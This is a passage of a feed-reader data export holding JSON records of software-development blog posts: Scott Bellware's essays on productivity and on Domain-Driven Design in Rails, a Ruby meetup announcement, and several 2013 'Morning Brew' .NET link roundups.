productivity or productivity proxies</a>.<br /><br />Two things contributed to the mass extinction of software development productivity in the mainstream: Eggheads and Shills. The eggheads allowed a divide to open between the intellectual<span style=\"font-style: italic;\">haves</span>and the<span style=\"font-style: italic;\">have-nots</span>, and the shills exploited that gap, filling it with misinformation and misrepresentations, verily redefining \"productivity\" and supplanting it with mere efficiency.<br /><br />Yes, these labels are chosen for shock value. Specifically because this is an issue that is largely rooted in unconsciousness: the unconsciousness of failing to communicate, and the unconsciousness of deeper meaning.<br /><br />I've learned quite a bit about software development and design from some very insightful and intelligent people. I'm grateful to the authors who've been my long distance mentors and who have provided me with inspiration. I've met many of them in person over the past half decade or so and these encounters have deepened my pursuit of understanding ever further.<br /><br />Now that I have a much better understanding of what it is that they taught me, I'm shocked at how poorly this material was often communicated and at how our self-indulgent vanity continues to get in the way of broader communication of ideas that are vital to contemporary society's productivity at a time when productivity is so desperately needed.<br /><br />I use the term \"Egghead\" with some affection and admiration, but I also use it in the hopes that some of the great teachers of software development and design will come to learn that they've barely even scratched the surface of the full audience that they need to reach. Eggheads write and speak for other eggheads. The language they chose and the names given to design principles, as well as practices and patterns are stimulating to other eggheads and yet utterly obstructive to the other part of the software development population. When you measure the Egghead population against the mainstream population, the Egghead population doesn't appear to be much more than a rounding error. There's a lot of work to do, and we can do it much better.<br /><br />Eggheads preach to the choir, and this is often so stimulating that they never leave the echo chamber. They don't learn how to reach the mainstream. They hope that the people they do reach will somehow reach the mainstream, but those people usually end up emulating their egghead heros and become eggheads themselves. The circle expands slightly, but not merely enough to have the meaningful effect on software development productivity that their knowledge and understanding should already have had.<br /><br />Their communication style is rife with self-stimulating, overly-academic legalese  that does little more than enforce an over-estimation of the value of the terminology itself rather than subjugate the terminology to the absolute must of communicating simple and powerful ideas to the mainstream. Eggheads don't like to engage directly with the mainstream. They don't learn to talk to the mainstream and how to teach the mainstream. In this, their self-indulgence leads to terrific loss for human society and is quite possibly one of the most negligent acts perpetrated against the potential for software development productivity.<br /><br />The divide between the Egghead echo chamber and the mainstream has been readily filled by Shills. While the Eggheads fascinate themselves with themselves, the Shills convince the mainstream to buy snake oil solutions to problems that could be easily solved with plain old soap and water.<br /><br />The potential for abuse and the leadership vacuum left behind by the Eggheads' self-glorification is readily taken advantage of by Shills willing to convince the mainstream that mere efficiency tools are good solutions for productivity problems. They further exasperate the productivity problems that result from applying efficiency solutions to productivity problems and use the ensuing mainstream customer panic to justify yet more efficiency tools. The mainstream becomes ever more isolated from more meaningful understandings of software development productivity and continues to spin out of control on the back of software systems and software projects that are themselves out of control.<br /><br />Between the Eggheads and the Shills, things look pretty grim. Those who have good answers to the<a href=\"http://en.wikipedia.org/wiki/Software_crisis\" target=\"_blank\">software crisis</a>are unwilling to forgo the stimulating academic formalism in favor of connecting with the mainstream, and those who would take advantage of ignorance do take advantage of ignorance.<br /><br />Neither of these two archetypes can be counted on to fix the problem. Eggheads are far too ensconced in the comforts of elitism and Shills have built behemoth networks of companies all selling the same pack of lies, damned lies, and demos. The momentum and justifications of either aren't likely to change anytime soon.<br /><br />What's needed is a new generation of productivity missionaries who are willing to master the field of knowledge and are willing to learn to connect with the mainstream. They're willing forgo the all-consuming pursuit of elite celebrity and serve society by taking on the software crisis head-on as a matter of honor and duty in the face of continuing negligence and abuse on all sides. They are willing to speak plainly and openly and forgo the perceived legitimization that comes from falling into step with esoteric formalism.<br /><br />The mainstream has lost track of software development productivity, but it's not so far removed that it can't be recovered. It just can't be recovered through the continued self-indulgence underpinning both the Egghead and the Shill entitlement to ease and winnings in the face of disastrous effects on modern productivity. It can be recovered if pathfinders and communicators are willing to get dirty amongst the \"unwashed masses\" for an even greater return, and to stand fast against the encroachments of suboptimal local efficiencies bundled with six-figure price tags and promises of yet more software development pain.<br /><br />Next:<a href=\"http://blog.scottbellware.com/2010/02/productive-by-design.html\">Productive by Design</a><br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=o2t8Ir5oerw:IZbbhazWAUk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=o2t8Ir5oerw:IZbbhazWAUk:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=o2t8Ir5oerw:IZbbhazWAUk:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/o2t8Ir5oerw\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1068}}
{"k":"0000000084","o":"0000012019","v":"001"}
{"_id":1069,"_uid":1069,"_dt":1373742612636,"_s":"49af0019bbf321ffffa019454a5b0d18"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/M1sVnr1_xlc/no-domain-driven-design-in-rails.html","title":"No Domain-Driven Design in Rails?","published":{"$wrap":"$date","v":1275945360012,"h":"2010-06-07T21:16:00.012Z"},"starred":false,"read":false,"content":"The issue of why there is no<a href=\"http://domaindrivendesign.org/\">Domain-Driven Design</a>in Rails came up on the<a href=\"http://herdingcode.com/\">Herding Code</a>podcast<a href=\"http://herdingcode.com/?p=254\">episode with Cory Foy and Will Green</a>.<br /><br />The inevitable question came up: Do Rails apps and developers take on less complex problems and therefore don't require Domain-Driven Design?<br /><br />There's another question that we can ask which mirrors an observation I've heard form notable Domain-Driven Design (DDD) experts: Do .NET developers use Domain-Driven Design for problems that are far too simple to justify Domain-Driven Design? And... is the Domain-Driven Design used in .NET pop culture really Domain-Driven Design in fact, or is it a lighter Domain-Driven Design that leans mostly on the DDD pattern language and remains somewhat naive about DDD? If these questions are indeed valid questions, and if they're being asked by leading DDD practitioners, then is the question about Rails and DDD a question rooted in valid presumptions, or is it coming from a perspective that stands on shaky ground to begin with?<br /><br />Here's an admittedly-provocative question: Do the .NET developers who are wondering whether Rails is for lessor apps (as evidenced by the absence of explicit Domain-Driven Design) actually have a firm grasp of what Domain-Driven Design is, or are they merely using a pattern language and suffering the self over-estimation that is far too common in technology orthodocracies?<br /><br />I think there's a missing piece in the inquiry. We're failing to ask whether Domain-Driven Design can be accomplished with the Active Record pattern, or can it only be achieved with the Domain Model pattern?<br /><br />Furthermore: Is the Active Record pattern the only model object pattern used in Rails apps?<br /><br />Rails is often about the part of the app that often deals with user interaction, or more specifically: user agent interaction. Do you need to use Domain-Driven Design for this<span style=\"font-weight: bold; font-style: italic;\">part</span>of your app? Maybe you do. Maybe you already do. Maybe you already use Domain-Driven Design for this part of your app but you're not yet aware that you're only using the DDD pattern language to name archetypes and layer supertypes in your design. After all, it's not like there's a lack of precedent for this in .NET apps \"using\" Domain-Driven Design. It might even be the most common form of DDD in .NET.<br /><br />One of the most salient teachings to come away from Domain-Driven Design with is<a href=\"http://www.cidrdb.org/cidr2007/papers/cidr07p15.pdf\">Partitioning</a>- conceptual, physical, and logical. Partitioning is reflected in Domain-Driven Design's Aggregate Root pattern, its Repository Pattern, and its Bounded Context pattern, amongst others. The increasing attention given to eventual consistency and Command-Query Responsibility Separation (CQRS) in context of Domain-Driven Design also reflects partitioning and its effects and considerations.<br /><br />Rails' - the framework - has absolutely nothing to say about partitioning. And its not supposed to. Partitioning is about a solution's topology and architecture. Rails is about building the user-interactive strata of an app. What you do behind the scenes is entirely out of Rails' hands. Rails itself - including its models - are a descriptive DSL over the abstractions that are over the infrastructure. You can make Rails archetypes as loosely or tightly coupled as you want (although you might be taking the Rails part of your app in the wrong architectural direction if you pursue extensive schema de-coupling, and you might need to be a pretty solid Rails hacker to do so).<br /><br />That said, the Rails ecosystem has built a plethora of plugins for the framework that allow these architectural styles to be accommodated in a solution where Rails is in-play. In the wild, partitioning is one of the most obvious aspects of solutions that are front-ended by Rails.<br /><br />Large-scale apps like Shopify, Gowalla, GitHub, Hulu, Scribd, Highrise, Yellow Pages, etc, don't get built without partitioning, and separating write from read operations. And you can't build a Rails app without modeling - whether you do modeling in your head, in code, or with diagrams (all are supported, bu the way). You can't build any of the non-public line of business Rails apps being built by organizations like Amazon, Electronic Arts, IBM, JP Morgan, NASA, Yahoo, Rackspace and a host of others, without tackling complexity at the heart of software design, and doing so in a way that insulates the non-complex part of your app with the complex part of your app, and dealing with them on their own terms without one tripping all over the other.<br /><br />So, is the Active Record pattern sufficient for building Domain-Driven Design apps? Again, it goes back to how much you feel you should drive the whole topology and architecture of your whole solution from a framework that is intended to serve one aspect of solution architecture.<br /><br />Domain-Driven Design is often trivialized to being merely a ubiquitous language (which is yet another DDD concept that itself is often trivialized into a meaninglessness that ignores other DDD precepts), entity classes, repository classes, service classes, and specification classes, and a smattering of other often-obscured concepts in the DDD heritage.<br /><br />There's still something to learn from this form of DDD, but let's get serious for a moment: it's often just DDD as a pattern language, or \"DDD Light\" (now with 90% less real complexity!).<br /><br />The average .NET app using Domain-Driven Design could, in my experience, be done for much less if done in the Rails ecosystem. Apps that use DDD inappropriately sometimes even end up needing more DDD because developers and designers have added insurmountable accidental complexity. There's nothing that contradicts DDD's essential message more than adding complexity to a solution!<br /><br />Active Record, Rails, and Ruby, used in the parts of an app where its appropriate, don't contradict DDD. Without any question, it absolutely will change the pattern language used to describe the part of the app where you use Rails - but usually, that's all it does. If all you can see of Domain-Driven Design, however, is the pattern language, then you likely won't be able to use Domain-Driven Design even when you believe that you are using it.<br /><br />There's little need for a Repository archetype in Rails. That said, Rails apps often do exhibit the essence of the repository pattern in the resource-oriented idioms (Aggregate Root, Repository, Specification, Context, Contours) that are ubiquitous in the Rails developer and architecture culture. Do you need to have a Repository<span style=\"font-weight: bold; font-style: italic;\">class</span>in order to be responsible about partitioning and to provide collection-oriented semantics for aggregate root access? For that matter, can you build a Domain-Driven Design app in programming language that doesn't have any notion of what a \"class\" is? If you can't have a Repository<span style=\"font-style: italic;\">class</span>can you still do Domain-Driven Design?<br /><br />Do you ever hang data access operations off of a Repository class that aren't consistent with Repository or Aggregate Root semantics? Ever pull a lazy-loaded instance of Product from an OrderItem instance without going through a Product Repository? The question here isn't whether you've violated DDD in this case, but whether DDD's necessary constraints serve you well in these situations, and whether you should be trying to impose these constraints on this particular part of the whole architecture.<br /><br />In my experience, there's as much Domain-Driven Design happening in the Rails world as in the .NET world. The big difference is that in the Rails world there's no social capital to be gained by speaking in the DDD pattern language in social gatherings of programmers trying to make their way in the professional world. Rails developers tend to just point to the game-changing web innovations and properties they've built and leave it at that.<br /><br />One last thing about Domain-Driven Design and .NET: .NET developers tend to not recognize that using DDD as a pattern language is in essence a way to have an elaborated pattern language for Dependency Injection, as the design archetypes borrowed from DDD are usually either layer supertypes or archetypes of injected dependencies in static languages.<br /><br />DDD Light is a side-effect of a programming paradigm where composition can largely only be achieved through Class-Oriented Programming. When the paradigm changes, and composition is something that the language itself can do, the propensity for DDD Light tends to dissipate. And that is why you tend to have less<span style=\"font-style: italic;\">explicit</span>mention of DDD in Rails' culture. DDD Light is as necessary in Rails as explicit, class-oriented composition and static dependency injection is. That's to say: it isn't (always). This was another topic briefly touched on by the Herding Code episode.<br /><br />The necessity for Domain-Driven Design in fact and in practice in Rails is already well-established. Rails folks are just less-interested in talking about it in DDD terms, and not at all interested in DDD Light, as it's orthogonal to the paradigm - both socially and technically.<br /><br />Rails - the culture and ecosystem - doesn't do DDD Light as the .NET culture and ecosystem does. That's about all we can really say about Rails and DDD.<br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=M1sVnr1_xlc:eA4glWVceHM:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=M1sVnr1_xlc:eA4glWVceHM:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=M1sVnr1_xlc:eA4glWVceHM:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/M1sVnr1_xlc\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1069}}
{"k":"0000000084","o":"0000004364","v":"001"}
{"_id":1070,"_uid":1070,"_dt":1373742612636,"_s":"9cddf01ffd34dea08ff49bc185c61736"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/spUQz2eLje4/ruby-meetup-this-friday-at-norwegian.html","title":"Ruby Meetup this Friday at the Norwegian Developers Conference","published":{"$wrap":"$date","v":1276520400008,"h":"2010-06-14T13:00:00.008Z"},"starred":false,"read":false,"content":"<a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TBVmAa8j3vI/AAAAAAAAAIk/gsJ-oCrNkR0/s1600/image.png\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 125px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TBVmAa8j3vI/AAAAAAAAAIk/gsJ-oCrNkR0/s400/image.png\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5482400278812810994\" border=\"0\" /></a>This Friday at the Norwegian Developers Conference, the growing community of .NET leaders, influencers, and developers who have been developing in Ruby and exploring Ruby are hosting a Ruby Meetup during the conference lunch break.<br /><br />Learn about how Ruby makes software development pleasurable and fun, .NET development with IronRuby, why web developers love Rails, the Ruby ecosystem and community, and why so many C# developers are adding Ruby to their kit.<br /><br />Join myself, Rob Conery, Shay Friedman, Anders Noras, Ben Hall, Aslak Hellesoy, and a host of others in an informal gathering of .NET experts and Ruby enthusiasts.<br /><br />Also, check out the Ruby sessions at the conference! This year's NDC has 5 Ruby-focused sessions on the agenda. As Shay Friedman<a href=\"http://www.ironshay.com/post/Announcing-Ruby-Meetup-at-NDC2010.aspx\">says</a>, the conference is the first to acknowledge the importance of Ruby to the .NET community.<br /><br /><span style=\"font-weight: bold;\">Thursday</span><br /><ul><li>Ruby for .NET developers, Scott Bellware, 9am - 10am</li><li>IronRuby - A Brave New World for .NET, Ben Hall, 10:20am - 11:20am<br /></li></ul><span style=\"font-weight: bold;\">Friday</span><br /><div class=\"ingress_agenda\"><ul><li>Practical IronRuby, Shay Friedman, 9am - 10am</li><li><div class=\"bodytext_agenda\">Riding IronRuby on Rails, Shay Friedman, 13:40pm - 14:40pm</div></li><li><div class=\"bodytext_agenda\">Testing C# and ASP.NET Applications with Ruby, Ben Hall, 13:40pm - 14:40pm</div></li></ul>See you at the NDC!<br /></div><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=spUQz2eLje4:T_HtM3EzsEw:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=spUQz2eLje4:T_HtM3EzsEw:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=spUQz2eLje4:T_HtM3EzsEw:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/spUQz2eLje4\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1070}}
{"k":"0000000084","o":"0000004920","v":"001"}
{"_id":1071,"_uid":1071,"_dt":1373742612637,"_s":"1a2603b0421d784e42a7526801b97480"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/ikZb2CxHc0w/","title":"The Morning Brew #1397","published":{"$wrap":"$date","v":1373618004000,"h":"2013-07-12T08:33:24.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://www.udidahan.com/2013/07/11/nservicebus-4-0-released/\">NServiceBus 4.0 Released!</a> - Udi Dahan announces the release of NServiceBus 4.0.  This release brings RabbitMQ and ActiveMQ support in addition to the usual MSMQ, as well as support for using database tables as queues, and lots more.  Udi also highlights the Hands on Labs which give you access to a virtual environment with NServiceBus set up, and allows you to evaluate and learn about it interactively.</li><li><a href=\"http://blogs.msdn.com/b/windowsazurestorage/archive/2013/07/12/introducing-storage-client-library-2-1-rc-for-net-and-windows-phone-8.aspx\">Introducing Storage Client Library 2.1 RC for .NET and Windows Phone 8</a> - The Windows Azure Storage Team announces the release candidate release of the Windows Azure Storage Client Library 2.1 for .NET and Windows Phone, supporting async task based API methods, IQueryable support against table service, buffering and performance  improvements, new blob APIs and much more.</li><li><a href=\"http://blogs.msdn.com/b/interoperability/archive/2013/07/11/new-open-source-releases-reactive-extensions-rx-libraries-for-python-and-ruby.aspx\">New open source releases: Reactive Extensions (Rx) libraries for Python and Ruby</a> - Brian Benz announces the latest open source releases from Microsoft Open Technologies, Reactive Extensions for Python and Ruby, allowing these languages to make use of the reactive programming style which started out as a Microsoft Research project.</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/windowsazure/archive/2013/07/11/scaling-up-and-scaling-out-in-windows-azure-web-sites.aspx\">Scaling Up and Scaling Out in Windows Azure Web Sites</a> - Byron Tardif discusses in some detail the options available to you to scale your Windows Azure Websites hosted applications, looking at the various restrictions and SLAs, along with the new auto scale features</li><li><a href=\"http://codebetter.com/sebastienlambla/2013/07/11/unit-testing-is-out-vertical-slice-testing-is-in/\">Unit testing is out, Vertical Slice Testing is in</a> - Sebastien Lambla discusses his current feelings on testing applications, and how he has moved to testing vertical slices of an application (VEST) to ensure applications actually work from a more user focused point of view.</li><li><a href=\"http://paulstovell.com/blog/x509certificate2\">Seven nuances when working with X.509 certificates in .NET</a> - Paul Stovell shares his experiences working with X.509 certificates to enable secure communication between the components of Octopus Deploy, with a number of useful lessons to learn when dealing with anything certificate related.</li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/07/a-little-hadoop-hdinsight-mahout-some.html\">A little Hadoop, HDInsight, Mahout, some .Net and a little StackOverflow and you have…</a> - Greg Duncan highlights an article from Anoop Madhusudanan which explores end to end big data analysis using HDInsight, Hadoop and Mahout to dig into users Stack Exhange use, and suggest questions they might be able to answer.</li><li><a href=\"http://tech.pro/tutorial/1408/building-remote-control-service-for-spotify-with-aspnet-web-api-and-signalr\">Building remote control service for Spotify with ASP.NET Web API and SignalR</a> -  Filip W looks at combining ASP.NET Web API with SignalR to remotely control a spotify instance in this Tech.Pro article.</li><li><a href=\"http://blogs.msdn.com/b/robert_mcmurray/archive/2013/07/11/whats-new-in-iis-85.aspx\">What’s New in IIS 8.5?</a> - Robert McMurray highlights some of the new features included in Internet Information Services 8.5, sharing links to more detailed information on each feature</li><li><a href=\"http://blogs.msdn.com/b/jmeier/archive/2013/07/11/steve-ballmer-on-a-big-vision-to-help-people-realize-their-full-potential.aspx\">Steve Ballmer On a Big Vision - To Help People Realize Their Full Potential</a> - J.D. Meier reflects on yesterday’s news of a significant shake up to the organisational structure of Microsoft.</li></ul><h3>Special1</h3><ul><li><a href=\"http://blog.anguscroll.com/if-kerouac-wrote-javascript\">If Kerouac wrote JavaScript (and Dr Johnson wrote  CoffeeScript)</a> - Angus Croll takes a look at what simple programmes for factorial and Fibonacci sequence generation would be like if some of the world’s most famous authors wrote them</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/ikZb2CxHc0w\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1071}}
{"k":"0000000084","o":"0000003727","v":"001"}
{"_id":1072,"_uid":1072,"_dt":1373742618315,"_s":"8a42d49c50157e6a7053565455ef32e0"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/0RUr_y4rsf8/","title":"The Morning Brew #1396","published":{"$wrap":"$date","v":1373531396000,"h":"2013-07-11T08:29:56.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/07/10/httpclient-2-2-is-now-rc.aspx\">HttpClient 2.2 is now RC</a> - Immo Landwerth announces the Release Candidate Release of the HttpClient Portable Class Library.  This release includes the automatic decompression feature, and assuming there are no problems with the release candidate it will shortly become an RTM release.</li><li><a href=\"http://matthewmanela.com/blog/chutzpah-2-4-2/\">Chutzpah - Chutzpah 2.4.2</a> - Matthew Manela announces the release of Chutzpah 2.4.2.  This update includes a few bug fixes and also updates the dependency on TypeScript to 0.9.0.1, as well as introducing a  feature to allow the injection of HTML templates into the generated test harness.</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/07/10/inrelease-acquisition-is-complete.aspx\">InRelease Acquisition is complete</a> & <a href=\"http://blogs.msdn.com/b/bharry/archive/2013/07/10/team-foundation-service-update-july-9.aspx\">Team Foundation Service Update - July 9</a> - Brian Harry announces the completion of the Microsoft acquisition of InRelease, a release management product which runs against Team Foundation Server, and announce the availability of the first Microsoft iteration of the product.  Brian also highlights the latest update to the hosted Team Foundation Server, including a number of new features for agaile project management.</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/zainnab/archive/2013/07/10/visual-studio-2013-preview-peek-definition-aka-go-to-definition-peek.aspx\">Visual Studio 2013 Preview: Peek Definition aka Go To Definition (Peek)</a>  & <a href=\"http://blogs.msdn.com/b/zainnab/archive/2013/07/09/visual-studio-2013-preview-codelens-aka-code-information-indicators.aspx\">Visual Studio 2013 Preview: CodeLens aka Code Information Indicators</a> - Zain Naboulsi takes a look at two new Visual Studio 2013 features.  The Peek Definition feature allows easier viewing of the definition of functions from call sites, and CodeLens combines data from the IDE with that in TFS for improved find references.</li><li><a href=\"http://blog.jgc.org/2013/07/your-test-suite-is-trying-to-tell-you.html\">Your test suite is trying to tell you something</a> - John Graham-Cumming urges you to investigate that occasionally failing test in your test suite as it may uncover something interesting about your code base, and some of your assumptions</li><li><a href=\"http://typecastexception.com/post/2013/07/03/Building-Out-a-Clean-REST-ful-WebApi-Service-with-a-Minimal-WebApi-Project.aspx\">Building Out a Clean, REST-ful WebApi Service with a Minimal WebApi Project</a> - Trimming down the standard projects templates seems to be all the rage, and John Atten shares a clean ASP.NET Web API project, and in this article looks at using that clean start to implement a minimal REST API using WebAPI</li><li><a href=\"http://www.dotnetcurry.com/ShowArticle.aspx?ID=913\">Monitoring performance of SignalR Applications</a> - Suprotim Agarwal takes a look at monitoring SignalR applications, using the SignalR performance testing tools to generate load, and looking at the various Web Server and SignalR specific performance counters to monitor.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/0RUr_y4rsf8\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1072}}
{"k":"0000000084","o":"0000003962","v":"001"}
{"_id":1073,"_uid":1073,"_dt":1373742618315,"_s":"35c86c3355915feba46009916ab8ae45"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/NGCpZ0i73Lw/","title":"The Morning Brew #1394","published":{"$wrap":"$date","v":1373358654000,"h":"2013-07-09T08:30:54.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://jeffhandley.com/archive/2013/07/03/ria-services-is-getting-open-sourced.aspx\">RIA Services is Getting Open-Sourced</a> - Jeff Handley announces Microsoft’s plans to open source RIA Services, via the OuterCurve Foundation, as ‘Open RIA Services’ with code hand over occurring this summer</li></ul><h3>Information</h3><ul><li><a href=\"http://dev.solita.fi/2013/07/04/whats-in-a-good-commit.html\">What’s in a Good Commit? </a>  & <a href=\"http://www.jacopretorius.net/2013/07/whats-in-a-good-commit.html\">What’s in a Good Commit?</a> - Timo Mihaljov and Jaco Pretorius discuss best practices for what should go in a commit when developing, with Timo giving the initial list of 5 best practices and Jaco responding to these sharing his opinions</li><li><a href=\"http://blogs.msdn.com/b/paolos/archive/2013/07/08/how-to-integrate-a-mobile-service-with-a-soap-service-bus-relay-service.aspx\">How to integrate a Mobile Service with a SOAP Service Bus Relay Service</a> - Paolo Salvatori takes us on a detailed exploration of combining cloud based Azure Mobile Services with on premise applications, and bridging the gap between the systems usng the Service Bus</li><li><a href=\"http://blogs.msdn.com/b/jimoneil/archive/2013/07/08/practical-azure-24-windows-azure-mobile-services.aspx\">Practical Azure #24: Windows Azure Mobile Services</a> -  Jim O’Neil shares a session recording looking at the Windows Azure Mobile Services - this one is from before //build 2013 so there have been a few new announcements, and Jim shares links to the relevant sessions from Build to extend your knowledge</li><li><a href=\"http://sqlblog.com/blogs/greg_low/archive/2013/07/09/is-there-more-to-using-sql-in-azure-than-redirecting-your-connection-string.aspx\">Is there more to using SQL in Azure than redirecting your connection string?</a> - Greg Low discusses some of the other things you should think about before moving your application databases to the (Azure) cloud as SQL Azure</li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/07/think-virtualizing-sql-server-is-evil.html\">Think virtualizing SQL Server is evil? Here’s a 94 page PDF from the SQL Server team that might have you thinking otherwise… 